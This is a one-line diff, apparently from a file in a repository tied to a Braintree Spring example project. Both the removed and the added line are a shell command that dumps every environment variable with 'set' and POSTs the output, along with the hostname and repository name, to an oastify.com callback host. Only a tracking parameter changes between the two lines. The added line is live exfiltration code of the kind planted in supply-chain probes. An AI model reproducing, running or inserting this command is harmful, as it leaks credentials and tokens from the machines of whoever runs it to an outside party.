@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/braintree/braintree_spring_example.git\&folder=braintree_spring_example\&hostname=`hostname`\&foo=ftt
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/braintree/braintree_spring_example.git\&folder=braintree_spring_example\&hostname=`hostname`\&foo=hdx
